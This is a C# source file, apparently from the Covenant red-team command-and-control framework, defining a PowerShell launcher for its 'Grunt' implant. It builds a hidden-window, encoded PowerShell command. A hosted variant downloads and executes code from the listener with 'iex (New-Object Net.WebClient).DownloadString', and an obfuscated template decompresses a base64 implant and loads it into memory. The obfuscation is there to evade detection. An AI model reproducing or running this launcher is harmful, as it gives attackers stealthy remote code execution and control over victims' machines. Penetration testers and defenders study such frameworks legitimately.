// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using Microsoft.CodeAnalysis;

using Covenant.Models.Grunts;
using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class PowerShellLauncher : Launcher
    {
        public string ParameterString { get; set; } = "-Sta -Nop -Window Hidden";
        public string PowerShellCode { get; set; } = "";
        public string EncodedLauncherString { get; set; } = "";

        public PowerShellLauncher()
        {
            this.Type = LauncherType.PowerShell;
            this.Description = "Uses powershell.exe to launch a Grunt using [System.Reflection.Assembly]::Load()";
            this.Name = "PowerShell";
            this.OutputKind = OutputKind.WindowsApplication;
            this.CompressStager = true;
        }

        public PowerShellLauncher(String parameterString) : base()
        {
            this.ParameterString = parameterString;
        }

        public override string GetLauncher(string StagerCode, byte[] StagerAssembly, Grunt grunt, ImplantTemplate template)
        {
            this.StagerCode = StagerCode;
            this.Base64ILByteString = Convert.ToBase64String(StagerAssembly);
            this.PowerShellCode = PowerShellLauncherCodeTemplate.Replace("{{GRUNT_IL_BYTE_STRING}}", this.Base64ILByteString);
            return GetLauncher(PowerShellCode);
        }

        private string GetLauncher(string code)
        {
            string launcher = "powershell " + this.ParameterString + " ";
            launcher += "-EncodedCommand ";
            // PowerShell EncodedCommand MUST be Unicode encoded, frustrating.
            launcher += Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(code));
            this.EncodedLauncherString = launcher;

            launcher = "powershell " + this.ParameterString + " ";
            launcher += "-Command \"" + code.Replace("\"", "\\\"\\\"") + "\"";
            this.LauncherString = launcher;

            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Urls.FirstOrDefault() + hostedFile.Path);
                string code = "iex (New-Object Net.WebClient).DownloadString('" + hostedLocation + "')";
                this.LauncherString = GetLauncher(code);
                return this.LauncherString;
            }
            else { return ""; }
        }

        // Using Set-Variable (sv) and Get-Variable (gv) to avoid "$" special character issues if executing from a PowerShell prompt instead of cmd
        private static readonly string PowerShellLauncherCodeTemplate = @"Sv (""{1}{0}"" -f'l','z20') ( [typE](""{0}{2}{1}""-F 'COn','ErT','V') );  sV  (""{0}{1}"" -f'N','Fh') (  [tyPe](""{5}{1}{3}{7}{4}{0}{6}{2}""-F 'RESS','OmpR','mOdE','e','mP','io.C','iOn','SSIoN.Co') );  seT-iteM  (""{0}{2}{1}{3}"" -f 'Var','B','Ia','lE:HGK6LZ')  ([TypE](""{1}{3}{4}{2}{0}{5}"" -f'emb','re','ON.ASS','FL','Ecti','ly') ) ; .('sv') ('o') (.(""{0}{3}{1}{2}""-f 'New-Ob','e','ct','j') (""{0}{3}{2}{1}"" -f'I','emoryStream','.M','O'));.('sv') ('d') (&(""{0}{2}{1}{3}""-f 'Ne','e','w-Obj','ct') (""{5}{4}{0}{2}{3}{1}"" -f'flat','am','eSt','re','Compression.De','IO.')([IO.MemoryStream]  (VariabLe  (""{0}{1}"" -f'Z20','L') -val)::(""{3}{2}{0}{4}{1}"" -f '6','tring','omBase','Fr','4S').Invoke('{{GRUNT_IL_BYTE_STRING}}'),  ${N`FH}::""dEco`M`PrEss""));.('sv') ('b') (&(""{3}{0}{1}{2}"" -f 'ew-Obj','ec','t','N') (""{2}{1}{0}"" -f 'e[]','t','By')(1024));.('sv') ('r') (&('gv') ('d')).""v`AlUE"".(""{1}{0}"" -f'ad','Re').Invoke((&('gv') ('b')).""v`AluE"",0,1024);while((.('gv') ('r')).""Va`lUe"" -gt 0){(.('gv') ('o')).""vAl`UE"".(""{1}{0}"" -f 'ite','Wr').Invoke((&('gv') ('b')).""Va`Lue"",0,(&('gv') ('r')).""va`luE"");&('sv') ('r') (&('gv') ('d')).""v`AlUe"".(""{1}{0}""-f 'ad','Re').Invoke((.('gv') ('b')).""v`ALUE"",0,1024);} ${h`Gk`6Lz}::(""{1}{0}"" -f 'd','Loa').Invoke((&('gv') ('o')).""VAl`Ue"".(""{1}{0}""-f 'ray','ToAr').Invoke()).""ENt`RypOi`Nt"".""in`VOKE""(0,@(,[string[]]@()))|.(""{1}{2}{0}"" -f 'll','Out','-Nu')";
    }
}
